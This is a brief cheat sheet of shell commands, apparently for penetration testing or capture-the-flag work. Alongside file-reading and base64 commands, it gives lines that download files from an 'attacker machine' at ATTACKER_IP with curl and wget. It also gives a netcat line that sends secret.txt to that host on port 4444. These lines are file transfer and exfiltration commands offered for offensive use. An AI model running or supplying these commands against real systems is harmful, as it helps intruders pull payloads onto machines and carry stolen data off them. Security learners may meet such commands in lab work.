# Read files
# Change file path to desired path
cat /path/to/file
less /path/to/file
head/tail /path/to/file

#change ATTACKER_IP to your ip
# Download files from attacker machine
curl http://ATTACKER_IP/file -o file
wget http://ATTACKER_IP/file

# Upload files to attacker via Netcat
nc ATTACKER_IP 4444 < secret.txt

# Base64 encode/decode
echo "secret" | base64
echo "c2VjcmV0" | base64 -d
